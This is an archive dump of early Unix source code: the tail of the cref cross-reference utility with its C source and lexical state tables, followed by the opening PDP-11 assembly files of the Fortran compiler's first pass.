		if(read(fi,itab.hptr,b[1]) < b[1]) {
			printf("Cannot read ignore/only file: %s\n",ignonl);
			dexit();
		}
		if(read(fi,itab.symt,b[2]) < b[2]) {
			printf("Cannot read ignore/only file: %s\n",ignonl);
			dexit();
		}
		close(fi);
	} else {
		close(fi);
		compile();
	}

	if((signal(1,1) & 1) == 0)	signal(1,&dexit);
	if((signal(2,1) & 1) == 0)	signal(2,&dexit);
	if((signal(3,1) & 1) == 0)	signal(3,&dexit);
/*	signal(4,&dexit);
	signal(5,&dexit);
	signal(6,&dexit);
	signal(7,&dexit);
	signal(8,&dexit);
	signal(10,&dexit);
	signal(11,&dexit);
	signal(12,&dexit);
*/
	if(utmp == 0) {
		while((tp[4] = creat(tmp[4],0)) < 0)
			tmp[4][9]++;
		close(tp[4]);
		tmp[0][9] = tmp[4][9];
		tmp[1][9] = tmp[4][9];
		tmp[2][9] = tmp[4][9];
		tmp[3][9] = tmp[4][9];
		tp[0] = creat(tmp[0],CREATC);
		tp[1] = creat(tmp[1],CREATC);
		tp[2] = creat(tmp[2],CREATC);
		tp[3] = creat(tmp[3],CREATC);
	} else {
		if((tp[0] = creat(utmp,CREATC)) < 0) {
		printf("Can't create user's temp file.\n");
			exit();
		}
	}

	return;
}

error(a)
{
	printf("Error %d\n",a);
	dexit();
}

dexit()
{
	extern	nflush;

/*	printf("nflush = %d\n",nflush);	/*DEBUG*/
	if(tp[0] > 0 && utmp == 0) {
		unlink(tmp[0]);
		unlink(tmp[1]);
		unlink(tmp[2]);
		unlink(tmp[3]);
		unlink(tmp[4]);
	}
	exit();
}

callsys(f,v)
	char	f[],*v[];
{
	int	t,status,i;

	if((t = fork()) == 0) {
		execv(f,v);
		printf("Can't find %s\n",f);
		exit(1);
	} else {
		if(t == -1) {
			printf("Try again\n");
			return(1);
		}
	}

	while(t != wait(&status));
/*	printf("Status = %o, %s\n",status,f);	/*DEBUG*/
	if((t = (status & 0377)) != 0) {
		if(t != 2) {
			printf("Fatal error in %s\n",f);
			printf("t = %d\n",t);
		}
		dexit();
	}
	return((status>>8) & 0377);
}

flags(argv)
	char	*argv[];
{
	int	j,xx;
	char	*ap;

	j = 1;
	ap = argv[1];
	while(*++ap != '\0') {
		switch(*ap) {

			default:
				printf("Unrecognized flag: %c\n",*ap);
				dexit();

			case '1':	/* Symbol first */
				order = 1;
				continue;

			case '2':	/* Current file first */
				order = 2;
				continue;

			case '3':	/* Current symbol first */
				order = 3;
				continue;

			case 'a':	/* Assembler */
				cflag = 0;
				continue;

			case 'c':	/* C */
				gtab = "/usr/lib/ctab";
				if(!xx)
					ignonl = "/usr/lib/cign";
				cflag = 1;
				continue;

			case 'e':	/* English */
				gtab = "/usr/lib/etab";
				if(!xx)
					ignonl = "/usr/lib/eign";
				continue;

			case 'i':	/* Ignore file */
				if(!xx) {
					xx = 1;
					only = 0;
					ignonl = argv[++j];
				}
				continue;

			case 'l':	/* Line numbers in col. 3 */
				cross = 0;
				continue;

			case 'o':	/* Only file */
				if(!xx) {
					xx = 1;
					only = 1;
					ignonl = argv[++j];
				}
				continue;

			case 's':	/* Symbols in col. 3 */
				cross = 1;
				continue;

			case 't':
				utmp = argv[++j];
				tmp[0] = argv[j];
				continue;

			case 'u':	/* Unique symbols only */
				usw = 1;
				continue;

			case 'x':	/* C externals */
				xsw = 1;
				gtab = "/usr/lib/ctab";
				if(!xx)
					ignonl = "/usr/lib/cign";
				cflag = 1;
				continue;
		}
	}
	return(j);
}


compile()
{
	char	buf[40],*b;
	int	i,v;

	fopen(ignonl,ibuf1);

	b = buf - 1;
	while((*++b = getc(ibuf1)) != -1) {
		if(*b == '\n') {
			*b = '\0';
			search(buf,b - buf,&itab,1);
			b = buf - 1;
		} else {
			if(*b == '\t') {
				v = 0;
				while((i = getc(ibuf1)) != -1) {
					if(i == '\n')	break;
					v = v*10 + (i - '0');
				}
				search(buf,b - buf,&itab,v);
				b = buf - 1;
			} else {
				if((b - buf) > 39) {
					printf("Ignore/only symbol too long");
					dexit();
				}
			}
		}
	}
	close(ibuf1);
	return;
}
-- /usr/source/cref/src/put.c mode=0100664 uid=3 gid=3 atime=174920783 mtime=169260064 --
int	bct[4];
int	optr[4];
char	bsp[2048];

char	*obuf[4]	{bsp,
			bsp + 512,
			bsp + 1024,
			bsp + 1536
			};

int	nflush;

put(fil,string,n)
	char	*string;
{
	extern	utmp;
	int	i;
	char	*o;

/*printf("%d %c %d\n",fil,*string,n);/*DEBUG*/

	string--;

	if((i = optr[fil] + n - 512) >= 0) {
		n =- i;
		o = &obuf[fil][optr[fil]] -1;
		while(--n >= 0)
			*++o = *++string;
		optr[fil] = 512;
		flsh(fil);
		n = i;
	}

	o = &obuf[fil][optr[fil]] - 1;
	optr[fil] =+ n;

	while(--n >= 0) {
		*++o = *++string;
	}
	return(0);
}

flsh(fil)
{
	extern	tp[],utmp;

	if(optr[fil] <= 0)	return(optr[fil]);

	if(bct[fil]++ >= 128 && utmp == 0) {
		printf("Wraparound temp file %d\n",fil);
		dexit();
	}
	nflush++;
	if(write(tp[fil],obuf[fil],optr[fil]) != optr[fil])
		return(-1);
	optr[fil] = 0;
	return(0);
}

-- /usr/source/cref/src/upost.c mode=0100664 uid=3 gid=3 atime=174920720 mtime=169260064 --
/*int	mbuf[1024];	/*INSTR*/
int	psw	1;
int	initf	1;

main(argc, argv)
	char	*argv[];
{
	auto	f,fct,file;

	if(argc < 2) {
		printf("Usage: cpost [-d] file1 file2 ...\n");
		exit();
	}

	if(*argv[1] == '-') {
		fct = argv[1][1] - '0';
		if((fct < 1) || (fct > 9)) {
			printf("-d: 0 < d < 10\n");
			exit();
		}
		argv++;
		argc--;
	} else {
		fct = 1;
	}

	f = 0;
	while(++f < argc) {
		file = open(argv[f], 0);

		edl(file, fct);

		close(file);
		psw = 0;
	}
	flsh(0);

	exit();
}

int	lno	1;

edl(file)
{
	auto t,l;
	char	static	buf[20],fld[20],line[200];
	char	c;
field:
	t = -1;
	while(((buf[++t] = get(file)) != '\t') && (buf[t] != -1))
		if(buf[t] == '\0')	goto done;

	if((c = buf[t]) == -1)	c = ' ';
	buf[t] = '\0';
	if(comp(buf,fld)) {
		lno++;
		goto junk;
	} else {
		if(lno == 0) {
			put(0,line,++l);
		}
		l = copy(buf,line);
		copy(buf,fld);
		line[--l] = c;
		lno = 0;
		goto fill;
	}

fill:
	while((line[++l] = get(file)) != '\n') {
		if(line[l] == -1)	line[l] = ' ';
		if(line[l] == '\0')	goto done;
	}

	goto field;

junk:
	while((*line = get(file)) != '\n')
		if(*line == '\0')	goto done;

	goto field;

done:
	if(lno == 0)
		put(0,line,++l);
		lno = 1;
	return(0);

}



gfld(file, buf)
	char	*buf;
{
	char	c;

	buf--;
	while(*++buf  = get(file)) {
		if((*buf == '\t') || (*buf == '\n')) {
			c = *buf;
			*buf = '\0';
			return(c);
		} else {
			continue;
		}
	}
	return('\0');
}

copy(a, b)
	char	*a,*b;
{
	char	*c;

	b--;
	c = --a;
	while(*++b = *++a);
	return(a - c);
}

comp(a, b)
	char	*a, *b;
{
/*	printf("comp: %s %s\n",a,b); /*DEBUG*/
	a--;
	b--;
	while(*++a == *++b) {
		if(*a == '\0')	return(1);
	}
	return(0);
}


char	buf[512];
int	nread	1;

get(ifile) int ifile;
{

	char static *ibuf;

	if(--nread){
		return(*ibuf++);
	}

	if(nread = read(ifile,buf,512)){
		if(nread < 0)goto err;

		ibuf = buf;
		return(*ibuf++);
	}

	nread = 1;
	return(0);

err:
	nread = 1;
	printf("read error\n");
	return(0);

}


int	tp[1]	1;
int	optr[4];
char	bsp[512];

char	*obuf[1]	bsp;

int	nflush;

put(fil,string,n)
	char	*string;
{
	int	i;
	char	*o;

/*printf("%d %c %d\n",fil,*string,n);/*DEBUG*/

	string--;

	if((i = optr[fil] + n - 512) >= 0) {
		n =- i;
		o = &obuf[fil][optr[fil]] -1;
		while(--n >= 0)
			*++o = *++string;
		optr[fil] = 512;
		flsh(fil);
		n = i;
	}

	o = &obuf[fil][optr[fil]] - 1;
	optr[fil] =+ n;

	while(--n >= 0) {
		*++o = *++string;
	}
	return(0);
}

flsh(fil)
{
	extern	tp[];

	if(optr[fil] <= 0)	return(optr[fil]);

	nflush++;
	if(write(tp[fil],obuf[fil],optr[fil]) != optr[fil])
		return(-1);
	optr[fil] = 0;
	return(0);
}

-- /usr/source/cref/tab mode=0140775 uid=3 gid=3 atime=174930098 mtime=174920718 --
-- /usr/source/cref/tab/atable mode=0100664 uid=3 gid=3 atime=174920713 mtime=169260072 --
skip
collect save
skip2 sk

cont coll save out asym agobl csym cgobl incl decl sk2 sk

collect/'/agobl;
collect/"/agobl;
collect/</agobl;
collect/\//agobl;
collect/\\/agobl;
collect/:/asym;
collect/a/cont;
collect/b/cont;
collect/c/cont;
collect/d/cont;
collect/e/cont;
collect/f/cont;
collect/g/cont;
collect/h/cont;
collect/i/cont;
collect/j/cont;
collect/k/cont;
collect/l/cont;
collect/m/cont;
collect/n/cont;
collect/o/cont;
collect/p/cont;
collect/q/cont;
collect/r/cont;
collect/s/cont;
collect/t/cont;
collect/u/cont;
collect/v/cont;
collect/w/cont;
collect/x/cont;
collect/y/cont;
collect/z/cont;
collect/A/cont;
collect/B/cont;
collect/C/cont;
collect/D/cont;
collect/E/cont;
collect/F/cont;
collect/G/cont;
collect/H/cont;
collect/I/cont;
collect/J/cont;
collect/K/cont;
collect/L/cont;
collect/M/cont;
collect/N/cont;
collect/O/cont;
collect/P/cont;
collect/Q/cont;
collect/R/cont;
collect/S/cont;
collect/T/cont;
collect/U/cont;
collect/V/cont;
collect/W/cont;
collect/X/cont;
collect/Y/cont;
collect/Z/cont;
collect/1/cont;
collect/2/cont;
collect/3/cont;
collect/4/cont;
collect/5/cont;
collect/6/cont;
collect/7/cont;
collect/8/cont;
collect/9/cont;
collect/0/cont;
collect/./cont;
collect/_/cont;
collect/
/out;
skip/'/agobl;
skip/"/agobl;
skip/</agobl;
skip/\//agobl;
skip/\\/agobl;
skip/
/out;
skip/./coll;
skip/_/coll;
skip/a/coll;
skip/b/coll;
skip/c/coll;
skip/d/coll;
skip/e/coll;
skip/f/coll;
skip/g/coll;
skip/h/coll;
skip/i/coll;
skip/j/coll;
skip/k/coll;
skip/l/coll;
skip/m/coll;
skip/n/coll;
skip/o/coll;
skip/p/coll;
skip/q/coll;
skip/r/coll;
skip/s/coll;
skip/t/coll;
skip/u/coll;
skip/v/coll;
skip/w/coll;
skip/x/coll;
skip/y/coll;
skip/z/coll;
skip/A/coll;
skip/B/coll;
skip/C/coll;
skip/D/coll;
skip/E/coll;
skip/F/coll;
skip/G/coll;
skip/H/coll;
skip/I/coll;
skip/J/coll;
skip/K/coll;
skip/L/coll;
skip/M/coll;
skip/N/coll;
skip/O/coll;
skip/P/coll;
skip/Q/coll;
skip/R/coll;
skip/S/coll;
skip/T/coll;
skip/U/coll;
skip/V/coll;
skip/W/coll;
skip/X/coll;
skip/Y/coll;
skip/Z/coll;
skip/0/sk2;
skip/1/sk2;
skip/2/sk2;
skip/3/sk2;
skip/4/sk2;
skip/5/sk2;
skip/6/sk2;
skip/7/sk2;
skip/8/sk2;
skip/9/sk2;
skip2/a/cont;
skip2/b/cont;
skip2/c/cont;
skip2/d/cont;
skip2/e/cont;
skip2/f/cont;
skip2/g/cont;
skip2/h/cont;
skip2/i/cont;
skip2/j/cont;
skip2/k/cont;
skip2/l/cont;
skip2/m/cont;
skip2/n/cont;
skip2/o/cont;
skip2/p/cont;
skip2/q/cont;
skip2/r/cont;
skip2/s/cont;
skip2/t/cont;
skip2/u/cont;
skip2/v/cont;
skip2/w/cont;
skip2/x/cont;
skip2/y/cont;
skip2/z/cont;
skip2/A/cont;
skip2/B/cont;
skip2/C/cont;
skip2/D/cont;
skip2/E/cont;
skip2/F/cont;
skip2/G/cont;
skip2/H/cont;
skip2/I/cont;
skip2/J/cont;
skip2/K/cont;
skip2/L/cont;
skip2/M/cont;
skip2/N/cont;
skip2/O/cont;
skip2/P/cont;
skip2/Q/cont;
skip2/R/cont;
skip2/S/cont;
skip2/T/cont;
skip2/U/cont;
skip2/V/cont;
skip2/W/cont;
skip2/X/cont;
skip2/Y/cont;
skip2/Z/cont;
skip2/0/cont;
skip2/1/cont;
skip2/2/cont;
skip2/3/cont;
skip2/4/cont;
skip2/5/cont;
skip2/6/cont;
skip2/7/cont;
skip2/8/cont;
skip2/9/cont;
skip2/
/out;
skip2/\//agobl;
-- /usr/source/cref/tab/ctable mode=0100664 uid=3 gid=3 atime=174920714 mtime=169260072 --
skip
collect save
skip2 sk

cont coll save out asym agobl csym cgobl incl decl sk2 sk tab semi

collect/\;/semi;
collect/_/cont;
collect/{/incl;
collect/}/decl;
collect/'/cgobl;
collect/\\/cgobl;
collect/"/cgobl;
collect/a/cont;
collect/b/cont;
collect/c/cont;
collect/d/cont;
collect/e/cont;
collect/f/cont;
collect/g/cont;
collect/h/cont;
collect/i/cont;
collect/j/cont;
collect/k/cont;
collect/l/cont;
collect/m/cont;
collect/n/cont;
collect/o/cont;
collect/p/cont;
collect/q/cont;
collect/r/cont;
collect/s/cont;
collect/t/cont;
collect/u/cont;
collect/v/cont;
collect/w/cont;
collect/x/cont;
collect/y/cont;
collect/z/cont;
collect/A/cont;
collect/B/cont;
collect/C/cont;
collect/D/cont;
collect/E/cont;
collect/F/cont;
collect/G/cont;
collect/H/cont;
collect/I/cont;
collect/J/cont;
collect/K/cont;
collect/L/cont;
collect/M/cont;
collect/N/cont;
collect/O/cont;
collect/P/cont;
collect/Q/cont;
collect/R/cont;
collect/S/cont;
collect/T/cont;
collect/U/cont;
collect/V/cont;
collect/W/cont;
collect/X/cont;
collect/Y/cont;
collect/Z/cont;
collect/1/cont;
collect/2/cont;
collect/3/cont;
collect/4/cont;
collect/5/cont;
collect/6/cont;
collect/7/cont;
collect/8/cont;
collect/9/cont;
collect/0/cont;
collect/
/out;
skip/\;/semi;
skip/_/coll;
skip/	/tab;
skip/{/incl;
skip/}/decl;
skip/*/cgobl;
skip/'/cgobl;
skip/"/cgobl;
skip/\\/cgobl;
skip/
/out;
skip/1/sk2;
skip/2/sk2;
skip/3/sk2;
skip/4/sk2;
skip/5/sk2;
skip/6/sk2;
skip/7/sk2;
skip/8/sk2;
skip/9/sk2;
skip/0/sk2;
skip/a/coll;
skip/b/coll;
skip/c/coll;
skip/d/coll;
skip/e/coll;
skip/f/coll;
skip/g/coll;
skip/h/coll;
skip/i/coll;
skip/j/coll;
skip/k/coll;
skip/l/coll;
skip/m/coll;
skip/n/coll;
skip/o/coll;
skip/p/coll;
skip/q/coll;
skip/r/coll;
skip/s/coll;
skip/t/coll;
skip/u/coll;
skip/v/coll;
skip/w/coll;
skip/x/coll;
skip/y/coll;
skip/z/coll;
skip/A/coll;
skip/B/coll;
skip/C/coll;
skip/D/coll;
skip/E/coll;
skip/F/coll;
skip/G/coll;
skip/H/coll;
skip/I/coll;
skip/J/coll;
skip/K/coll;
skip/L/coll;
skip/M/coll;
skip/N/coll;
skip/O/coll;
skip/P/coll;
skip/Q/coll;
skip/R/coll;
skip/S/coll;
skip/T/coll;
skip/U/coll;
skip/V/coll;
skip/W/coll;
skip/X/coll;
skip/Y/coll;
skip/Z/coll;
skip2/{/incl;
skip2/}/decl;
skip2/a/cont;
skip2/b/cont;
skip2/c/cont;
skip2/d/cont;
skip2/e/cont;
skip2/f/cont;
skip2/g/cont;
skip2/h/cont;
skip2/i/cont;
skip2/j/cont;
skip2/k/cont;
skip2/l/cont;
skip2/m/cont;
skip2/n/cont;
skip2/o/cont;
skip2/p/cont;
skip2/q/cont;
skip2/r/cont;
skip2/s/cont;
skip2/t/cont;
skip2/u/cont;
skip2/v/cont;
skip2/w/cont;
skip2/x/cont;
skip2/y/cont;
skip2/z/cont;
skip2/A/cont;
skip2/B/cont;
skip2/C/cont;
skip2/D/cont;
skip2/E/cont;
skip2/F/cont;
skip2/G/cont;
skip2/H/cont;
skip2/I/cont;
skip2/J/cont;
skip2/K/cont;
skip2/L/cont;
skip2/M/cont;
skip2/N/cont;
skip2/O/cont;
skip2/P/cont;
skip2/Q/cont;
skip2/R/cont;
skip2/S/cont;
skip2/T/cont;
skip2/U/cont;
skip2/V/cont;
skip2/W/cont;
skip2/X/cont;
skip2/Y/cont;
skip2/Z/cont;
skip2/1/cont;
skip2/2/cont;
skip2/3/cont;
skip2/4/cont;
skip2/5/cont;
skip2/6/cont;
skip2/7/cont;
skip2/8/cont;
skip2/9/cont;
skip2/0/cont;
skip2/./cont;
skip2/
/out;
-- /usr/source/cref/tab/etable mode=0100664 uid=3 gid=3 atime=174920715 mtime=169260073 --
skip
collect save
skip2

cont coll save out egobl hyphen pno

skip//pno;
skip/
/out;
skip/a/coll;
skip/b/coll;
skip/c/coll;
skip/d/coll;
skip/e/coll;
skip/f/coll;
skip/g/coll;
skip/h/coll;
skip/i/coll;
skip/j/coll;
skip/k/coll;
skip/l/coll;
skip/m/coll;
skip/n/coll;
skip/o/coll;
skip/p/coll;
skip/q/coll;
skip/r/coll;
skip/s/coll;
skip/t/coll;
skip/u/coll;
skip/v/coll;
skip/w/coll;
skip/x/coll;
skip/y/coll;
skip/z/coll;
skip/A/coll;
skip/B/coll;
skip/C/coll;
skip/D/coll;
skip/E/coll;
skip/F/coll;
skip/G/coll;
skip/H/coll;
skip/I/coll;
skip/J/coll;
skip/K/coll;
skip/L/coll;
skip/M/coll;
skip/N/coll;
skip/O/coll;
skip/P/coll;
skip/Q/coll;
skip/R/coll;
skip/S/coll;
skip/T/coll;
skip/U/coll;
skip/V/coll;
skip/W/coll;
skip/X/coll;
skip/Y/coll;
skip/Z/coll;
collect/'/cont;
collect/-/hyphen;
collect/
/out;
collect/a/cont;
collect/b/cont;
collect/c/cont;
collect/d/cont;
collect/e/cont;
collect/f/cont;
collect/g/cont;
collect/h/cont;
collect/i/cont;
collect/j/cont;
collect/k/cont;
collect/l/cont;
collect/m/cont;
collect/n/cont;
collect/o/cont;
collect/p/cont;
collect/q/cont;
collect/r/cont;
collect/s/cont;
collect/t/cont;
collect/u/cont;
collect/v/cont;
collect/w/cont;
collect/x/cont;
collect/y/cont;
collect/z/cont;
collect/A/cont;
collect/B/cont;
collect/C/cont;
collect/D/cont;
collect/E/cont;
collect/F/cont;
collect/G/cont;
collect/H/cont;
collect/I/cont;
collect/J/cont;
collect/K/cont;
collect/L/cont;
collect/M/cont;
collect/N/cont;
collect/O/cont;
collect/P/cont;
collect/Q/cont;
collect/R/cont;
collect/S/cont;
collect/T/cont;
collect/U/cont;
collect/V/cont;
collect/W/cont;
collect/X/cont;
collect/Y/cont;
collect/Z/cont;
skip2/a/coll;
skip2/b/coll;
skip2/c/coll;
skip2/d/coll;
skip2/e/coll;
skip2/f/coll;
skip2/g/coll;
skip2/h/coll;
skip2/i/coll;
skip2/j/coll;
skip2/k/coll;
skip2/l/coll;
skip2/m/coll;
skip2/n/coll;
skip2/o/coll;
skip2/p/coll;
skip2/q/coll;
skip2/r/coll;
skip2/s/coll;
skip2/t/coll;
skip2/u/coll;
skip2/v/coll;
skip2/w/coll;
skip2/x/coll;
skip2/y/coll;
skip2/z/coll;
skip2/A/coll;
skip2/B/coll;
skip2/C/coll;
skip2/D/coll;
skip2/E/coll;
skip2/F/coll;
skip2/G/coll;
skip2/H/coll;
skip2/I/coll;
skip2/J/coll;
skip2/K/coll;
skip2/L/coll;
skip2/M/coll;
skip2/N/coll;
skip2/O/coll;
skip2/P/coll;
skip2/Q/coll;
skip2/R/coll;
skip2/S/coll;
skip2/T/coll;
skip2/U/coll;
skip2/V/coll;
skip2/W/coll;
skip2/X/coll;
skip2/Y/coll;
skip2/Z/coll;
-- /usr/source/cref/tab/mtab.c mode=0100664 uid=3 gid=3 atime=174920701 mtime=169260073 --
# include "../mcons.h"
struct	{
		int	cl[NUMC];
	}tab[NUMS];
char	state[NUMS][SIZS];
char	class[NUMC][SIZC];
char	act[NUMA][SIZA];
char	def[NUMS][SIZA];
char	temp[SIZA];

char	*st[NUMS];
char	*df[NUMS];
char	*cl[NUMC];
char	*ac[NUMA];

int	t1;
int	t2;


main(argc,argv)	char	**argv;
{

	extern	fin;
	char	fl,nlfl,c,bfl,fo,brk;
	int	cs,ca,cc,i,j,cd;

	if(argc != 3) {
		printf("Usage: mtab input output\n");
		exit();
	}

	if((fo = creat(argv[2],0644)) < 0) {
		printf("Output file.\n");
		exit();
	}
	if((fin = open(argv[1],0)) < 0) {
		printf("Input file.\n");
		exit();
	}



	nlfl = 1;
	i = -1;
	while(brk = rword()) {
		switch (brk) {
			case '\n':
				if(nlfl) {
					move(temp,state[++i]);
					st[i] = &state[i];
				} else {
					move(temp,def[i]);
					df[i] = &def[i];
					nlfl = 1;
				}
				continue;
			case ' ':
				if(nlfl) {
					move(temp,state[++i]);
					st[i] = &state[i];
					nlfl = 0;
				} else {
					error(7);
				}
				continue;
		}
	}


	i = 128;
	while(--i) {
		class[i][0] = i;
		class[i][1] = '\0';
		cl[i] = &class[i];
	}
	cl[0] = &class[0];


	bfl = nlfl = 0;
	t1 = 0;
	t2 = -1;
	while(c = getchar()) {

		switch(c) {

			default:
				if(t1 >= NUMA)	error(4);
				bfl = nlfl = 0;
				act[t1][++t2<8?t2:7] = c;
				continue;

			case '\n':
				if(nlfl)	break;
				nlfl = 1;

			case ' ':
				if(bfl)	continue;
				bfl = 1;
				act[t1][++t2<8?t2:7] = '\0';
				ac[t1] = &act[t1];
				t1++;
				t2 = -1;
				continue;
		}
	break;
	}
	if(c == '\0')	exit();

	i = -1;
	while(++i < NUMS) {
		if(df[i]) {
			cd = find(ac,df[i],NUMA);
			j = -1;
			while(++j < NUMC)
				tab[i].cl[j] = cd;
		}
	}


	fl = 0;
	i = -1;
	while(c = getchar()) {

		switch(c) {

			case '\\':
				temp[++i] = getchar();
				continue;

			case '\n':
				if(fl != 1)	continue;

			default:
				temp[++i] = c;
				continue;

			case '/':
				temp[++i] = '\0';
				i = -1;
				switch(fl) {
					case 0:
						cs = find(st,temp,NUMS);
						fl = 1;
						continue;

					case 1:
						cc = find(cl,temp,NUMC);
						fl = 2;
						continue;

					default:
						error(1);

				}

			case ';':

				if(fl != 2)	error(2);

				temp[++i] = '\0';
				i = -1;
				ca = find(ac,temp,NUMA);

/*printf("%o %o %o\n",cs,cc,ca); /*DEBUG*/
				tab[cs].cl[cc] = ca;

				fl = 0;
				continue;


		}
	}

	i = -1;
	while(++i < NUMS)
		write(fo,tab[i].cl,256);

}

error(a)
{

	printf("Error %d\n",a);
	exit();

}

find(a,b,c)	char	(*a[])[];
		char	b[];
		int	c;
{
	int	i,j;

/*	printf("%s\n",b); /*DEBUG*/
	i = -1;
	while(++i < c) {
/*	printf("	%s\n",a[i]); /*DEBUG*/
		j = 0;
/*	printf("b = %c\ta = %c\n",b[0],(*a[i])[0]); /*DEBUG*/
		while(b[j] == (*a[i])[j]) {
			if(b[j] == '\0')	goto found;
			j++;
		}
	}
found:
	return(i);
}

rword() {

	char	c;
	int	ct;

	ct = -1;
	while(c = getchar()) {
		switch(c) {

			default:
				temp[++ct] = c;
				continue;

			case '\n':
				if(ct == -1)	return('\0');
			case ' ':
				temp[++ct] = '\0';
				return(c);
		}
	}
}

move(a,b)	char	*a;
		char	*b;
{
	while((*b++ = *a++) != '\0');
	return;
}

-- /usr/source/fort mode=0140775 uid=3 gid=3 atime=174930097 mtime=174921161 --
-- /usr/source/fort/f1 mode=0140775 uid=3 gid=3 atime=174930094 mtime=174920859 --
-- /usr/source/fort/f1/f11.s mode=0100664 uid=3 gid=3 atime=174920839 mtime=174844391 --
/
/

/ f11 -- fortran command
/

.globl	pass1

.globl	fptrap
.globl	getline
.globl	flush
.globl	perror
.globl	lookup
.globl	getype
.globl	ssubr
.globl	sfunc
.globl	sbloc
.globl	sextr
.globl	sdime
.globl	scomm
.globl	sequi
.globl	sdata
.globl	sform
.globl	simpl
.globl	stype
.globl	isagn
.globl	ptemp
.globl	funok
.globl	signoff
.globl	fopen
.globl	fcreat
.globl	lookid
.globl	tfil1, tfil2
.globl	tfildiag

pass1:
	sys	signal; 4; fptrap
	cmp	(sp)+,$2
	bge	1f
2:
	mov	$1,r0
	sys	write; mes2; emes2-mes2
	clr	r0
	sys	seek; 0; 2
	mov	$-1,r0		/ bad status
	sys	exit
1:
	tst	(sp)+
	mov	(sp)+,r0
	jsr	r5,fopen; ibuf
	bcs	2b
	mov	$tfil1,r0
	jsr	r5,fcreat; obuf
	bcs	2f
	mov	$tfil2,r0
	jsr	r5,fcreat; tbuf
	bcc	1f
2:
	jmp	tfildiag
1:

/ data segment initialization

	mov	$2,nxtaloc
	mov	$errb,errp
	mov	$esymtab,esymp
	mov	$namebuf,namep
	movb	$'_,symbuf-1
	jsr	r5,lookid; blankc
	bis	$40,symtab(r3)
	mov	$imptab,r3
1:
	mov	$realcon,r0		/ real*4
	cmp	r3,$imptab+[2*['i-'a]]
	blo	2f
	cmp	r3,$imptab+[2*['n-'a]]
	bhi	2f
	mov	$intcon,r0		/ integer*4
2:
	mov	r0,[2*26.](r3)		/ lower case
	mov	r0,(r3)+		/ upper case
	cmp	r3,$imptab+[2*26.]
	blo	1b

/ call pass1

/	main scan loop for pass1
/	picks up non executable statements
/

scan1:
	jsr	r5,getline
	mov	$line,r1
	jsr	r5,isagn
		br 2f
	mov	r1,r2
	jsr	r5,lookup; stmtab
		br 1f
	mov	r2,r1
	jsr	r5,*sublst(r0)
	mov	pc,funok
	jsr	r5,perror
	br	scan1
1:
	jsr	r5,getype
		br 2f
	mov	r2,r1
	jsr	r5,stype
	jsr	r5,perror
	mov	pc,funok
	br	scan1
2:
	jsr	r5,ptemp; 'l; efno; line
	jsr	r5,flush; tbuf
	jsr	r5,signoff; 1

sublst:
	ssubr
	sfunc
	sbloc
	sextr
	sdime
	scomm
	sequi
	sdata
	sform
	simpl

stmtab:
	<subroutine\0>
	<function\0>
	<blockdata\0>
	<external\0>
	<dimension\0>
	<common\0>
	<equivalence\0>
	<data\0>
	<format\0>
	<implicit\0>
	<\0>
	.even


mes2:
	<Input file?\n>
emes2:
blankc:
	<_\n\0>
	.even

-- /usr/source/fort/f1/f12.s mode=0100664 uid=3 gid=3 atime=174920842 mtime=174844395 --
/
/

/ f12 -- type statements and type getter subroutine
/
/

.globl	stype
.globl	getype
.globl	typtab

.globl	sfunc1
.globl	lookup
.globl	getsym
.globl	error
.globl	sdime1

stype:
	mov	r0,-(sp)
	mov	r1,r2
	jsr	r5,lookup; funtab
		br 1f
	mov	r2,r1
	mov	(sp)+,r0
	jmp	sfunc1
1:
	jsr	r5,getsym
	tst	r0
	bne	3f		/ junk error if not identifier
	mov	symtab(r3),r0
	bic	$![377\<8+7],r0 / size,type
	beq	2f
	cmp	r0,(sp)		/ redefined, but same
	beq	2f
	jsr	r5,error; 3.
2:
	bic	$377\<8+7,symtab(r3)
	bis	(sp),symtab(r3)	/ set in type and size
	mov	r3,-(sp)
	jsr	r5,getsym
	cmp	r0,$32.		/ ( for dimension
	bne	2f
	mov	(sp),r3
	jsr	r5,sdime1
	jsr	r5,getsym
2:
	tst	(sp)+
	cmp	r0,$36.		/ , for another list element
	beq	1b
	cmp	r0,$40.		/ eos
	beq	1f
3:
	jsr	r5,error; 2.	/ junk
1:
	tst	(sp)+
	rts	r5

funtab:
	<function\0>
	<\0>

getype:
	mov	r1,r2
	jsr	r5,lookup; typtab
		br 1f
	mov	tvaltab(r0),r0
	tst	(r5)+
1:
	rts	r5

tvaltab:
	log1con
	logcon
	int1con
	int2con
	intcon
	dcplxcon
	dblcon
	cplxcon
	dblcon
	realcon

typtab:
	<logical*1\0>
	<logical\0>
	<integer*1\0>
	<integer*2\0>
	<integer\0>
	<doublecomplex\0>
	<doubleprecision\0>
	<complex\0>
	<real*8\0>
	<real\0>
	<\0>
-- /usr/source/fort/f1/f13.s mode=0100664 uid=3 gid=3 atime=174920844 mtime=174844400 --
/
/

/ f13 -- dimension and array declarator
/
/	dimension
/
/
.globl	sdime
.globl	sdime1

.globl	getsym
.globl	error
.globl	geti
.globl	dimu

sdime:
	jsr	r5,getsym
	tst	r0
	bne	3f		/ junk error
	mov	r3,-(sp)
	jsr	r5,getsym
	mov	(sp)+,r3
	cmp	r0,$32.		/ (
	beq	2f
	jsr	r5,error; 4.	/ no ( in dimension
	rts	r5
2:
	jsr	r5,sdime1
	jsr	r5,getsym
	cmp	r0,$36.		/ ,
	beq	sdime
	cmp	r0,$40.
	beq	1f
3:
	jsr	r5,error; 5.
1:
	rts	r5

/ get dimension info and store in
/ symbol table entry
/ r3 points at symbol table
/ r1 points just beyond (
sdime1:
	bit	$70,symtab(r3)	/ class
	beq	1f
	jsr	r5,error; 6.	/ already classed
1:
	mov	r3,-(sp)
	bic	$70,symtab(r3)
	bis	$20,symtab(r3)	/ set as array
	clr	-(sp)		/ marker
1:
	jsr	r5,getsym
	cmp	r0,$2		/ constant
	bne	2f
	cmp	r3,$intcon	/ integer*4
	bne	3f
	jsr	r5,geti
	tst	r0
	ble	3f
	mov	r0,-(sp)
	br	4f
2:
	tst	r0
	bne	3f		/ identifer
	tstb	symtab(r3)
	bge	3f		/ not parameter
	neg	r3
	mov	r3,-(sp)
	mov	sp,r0
2:
	tst	(r0)+
	bne	2b
	mov	(r0),r0
	tstb	symtab(r0)
	bge	3f		/ array not a param
4:
	jsr	r5,getsym
	cmp	r0,$36.		/ ,
	beq	1b
	cmp	r0,$34.		/ )
	beq	1f
3:
	jsr	r5,error; 7.
1:
	mov	esymp,r0
	clr	r2
	mov	dimu,-(r0)
	inc	dimu		/ unique number
1:
	inc	r2
	mov	(sp)+,-(r0)
	bne	1b
	dec	r2
